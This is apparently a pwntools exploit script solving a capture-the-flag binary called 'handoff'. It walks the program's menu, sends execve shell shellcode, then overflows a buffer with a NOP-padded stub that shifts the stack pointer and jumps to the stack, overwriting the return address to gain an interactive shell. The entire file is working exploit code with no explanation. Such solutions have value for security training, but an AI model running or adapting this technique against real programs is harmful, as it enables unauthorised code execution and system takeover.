from pwn import *

context.binary = elf = ELF("./handoff",checksec=False)

if args.LOCAL:
    p = process(elf.path)
else:
    p = remote()


# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(p, gdbscript="")



#1
p.sendline(b"1")
p.sendline(b"p1scok")

#2
p.sendline(b"2")
p.sendline(b"0")
shellcode = asm(shellcraft.sh()).ljust(33, b'A')
p.sendline(shellcode)


jmp_rax = asm('''
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    sub rsp, 0x2d8
    jmp rsp
    nop
    nop
    nop
    nop
    nop
    nop
    nop
              '''
)
#0x7fffffffdbe8-0x7fffffffdec0 #rsp : rbp => rbp - rsp


#3
p.sendline(b"3")
print(f'lenght of pl: {len(jmp_rax)}')
p.send(jmp_rax + p64(0x0040116c))

# call_rax = p64(0x00401014)

# buf = 0x2d8

p.interactive()